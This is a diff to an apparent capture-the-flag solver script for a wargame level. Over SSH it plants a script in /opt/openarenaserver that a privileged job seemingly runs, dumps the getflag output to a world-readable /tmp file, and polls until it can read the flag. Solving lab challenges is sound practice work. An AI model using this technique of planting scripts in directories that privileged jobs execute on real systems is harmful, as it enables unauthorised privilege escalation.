@@ -125,6 +125,8 @@ main() {
     level05_password=$(cat "$CURR_DIR_PATH/../../level04/flag");
 
     init_ssh_socket "$level05_socket_path" "$host" "$port" "$level05_username" "$level05_password";
+    ssh_exec_via_socket "$level05_socket_path" "$host" "$port" "$level05_username" "echo \"/bin/getflag > /tmp/checkflag.txt; chmod 777 /tmp/checkflag.txt\" > /opt/openarenaserver/getflag.sh;";
+    checkflag=$(ssh_exec_via_socket "$level05_socket_path" "$host" "$port" "$level05_username" "while [ ! -e /tmp/checkflag.txt ]; do sleep 0.5; done; cat /tmp/checkflag.txt;" | head -n 1 | awk '{ print $NF }');
     close_ssh_socket "$level05_socket_path" "$host" "$port" "$level05_username";
 
     flag_outpath="$CURR_DIR_PATH/../flag";
